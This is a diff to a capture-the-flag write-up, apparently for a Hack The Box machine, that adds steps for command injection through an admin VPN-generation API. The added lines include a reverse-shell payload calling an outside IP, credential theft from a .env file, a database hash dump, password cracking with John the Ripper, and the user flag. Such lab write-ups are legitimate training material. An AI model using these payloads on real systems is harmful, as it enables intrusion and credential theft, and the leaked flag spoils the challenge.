@@ -190,12 +190,72 @@
       1. We now need to somehow get code execution
       2. We can more than likely use the /generate api endpoint
       3. POST
-         1. /api/v1/user/vpn/generate
+         1. /api/v1/admin/vpn/generate
+            1. ERROR: {"status":"danger","message":"Missing parameter: username"}
+         2. /api/v1/admin/vpn/generate  
             1. Add Content-Type:application/json
-            2. Add {"username":";ls"}
+            2. Add {"username":";[PAYLOAD-HERE]"}
+               1. PAYLOAD -> ls
+                  1. Didn't work
+               2. PAYLOAD -> ls #
+                  1. Database.php, Router.php, VPN, assets, controllers, css, fonts, images, index.php, js, views
+               3. PAYLOAD (for revshell) -> bash -c 'bash -i >& /dev/tcp/10.10.15.11/1234 0>&1'
+                  1. SUCCESS!!!
+8. ENUMERATION
+   1. Lets checkout the .env file
+      1. > cat .env
+
+            ```env
+                DB_HOST=127.0.0.1
+                DB_DATABASE=htb_prod
+                DB_USERNAME=admin
+                DB_PASSWORD=SuperDuperPass123
+            ```
+
+            1. In here we see a database username and password, lets see if we can signin and find other credentials
+   2. MYSQL
+      1. > mysql -uadmin -p
+         1. PASS: SuperDuperPass123
+      2. > show databases;
+         1. htb_prod, information_schema
+      3. > use htb_prod;
+      4. > show tables;
+         1. invite_codes, users
+      5. > select * from users;
+
+            ```text
+                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
+                | id | username     | email                      | password                                                     | is_admin |
+                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
+                | 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
+                | 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
+                | 13 | sample       | sample@gmail.com           | $2y$10$6axL2ObRdok.MfInGsYRFeuB4tJdyK69OqeCuMEzzWgqEOYANcGfy |        1 |
+                | 14 | test         | test@2million.htb          | $2y$10$J.9Dy1KRYolK/AGn4mO7XOIiixEXZIXG1y0CDSYl5DwQjyxaWWOhW |        0 |
+                +----+--------------+----------------------------+--------------------------------------------------------------+----------+
+            ```
+
+            1. In here we see several users, in fact we even see our "sample" user, and their hashed passwords
+            2. Use the hashes for john-the-ripper
+   3. JOHN-THE-RIPPER
+      1. > echo "$2y$10$J.9Dy1KRYolK/AGn4mO7XOIiixEXZIXG1y0CDSYl5DwQjyxaWWOhW" > test.hash
+      2. > john ./test.hash
+         1. RESPONSE: 12345
+         2. Now lets try this user
+   4. Switch Users
+      1. Sign in as test
+         1. > su test
+         2. RESPOSNE: su: user test does not exist or the user entry does not contain all the required fields
+      2. Maybe we need to use the admin user for MYSQL rather then cracking the hash
+         1. > su admin
+            1. PW: SuperDuperPass123
+   5. FLAG
+      1. Get the user flag
+         1. > cat /home/admin/user.txt
+            1. FLAG: `243c095551e2740e5553c033acbbc37b`
 
 
 ## QUESTIONS
 
 1. Submit user flag
+   1. `243c095551e2740e5553c033acbbc37b`
 2. Submit root flag
